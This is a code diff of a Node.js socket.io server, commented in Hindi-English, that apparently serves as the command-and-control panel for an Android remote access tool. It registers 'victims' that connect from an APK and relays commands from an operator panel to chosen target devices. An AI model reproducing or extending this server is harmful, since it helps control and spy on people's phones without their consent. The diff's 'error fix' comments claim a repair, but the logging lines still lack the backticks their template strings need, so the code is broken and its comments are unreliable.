@@ -24,7 +24,7 @@ app.get("/", (req, res) => {
 let devices = [];
 
 io.on("connection", (socket) => {
-    // ===> YAHAN THEEK KIYA GAYA HAI <===
+    // ===> ERROR FIX: String ke andar [ aur ] <===
     console.log([+] Ek naya user connect hua: ${socket.id});
 
     // APK 'victim_connect' bhejta hai, to hum use sunenge.
@@ -34,7 +34,7 @@ io.on("connection", (socket) => {
         const battery = data.battery || '--';
         
         if (!devices.find(d => d.deviceId === deviceId)) {
-            // ===> YAHAN THEEK KIYA GAYA HAI <===
+            // ===> ERROR FIX: String ke andar [ aur ] <===
             console.log([+] Device register hua: ${deviceName} (${deviceId}));
             devices.push({ deviceId, deviceName, battery });
         }
@@ -49,7 +49,7 @@ io.on("connection", (socket) => {
         const eventType = command.type;
         const eventData = command.data || {};
 
-        // ===> YAHAN THEEK KIYA GAYA HAI <===
+        // ===> ERROR FIX: String ke andar [ aur ] <===
         console.log([>] Panel se command aaya: '${eventType}', Bhej rahe hain -> ${command.targetId});
         
         io.to(command.targetId).emit(eventType, eventData);
@@ -73,7 +73,7 @@ io.on("connection", (socket) => {
 
     // Connection tootne par
     socket.on("disconnect", () => {
-        // ===> YAHAN THEEK KIYA GAYA HAI <===
+        // ===> ERROR FIX: String ke andar [ aur ] <===
         console.log([-] User disconnect hua: ${socket.id});
         devices = devices.filter(d => d.deviceId !== socket.id);
         io.emit('devices_list', devices);
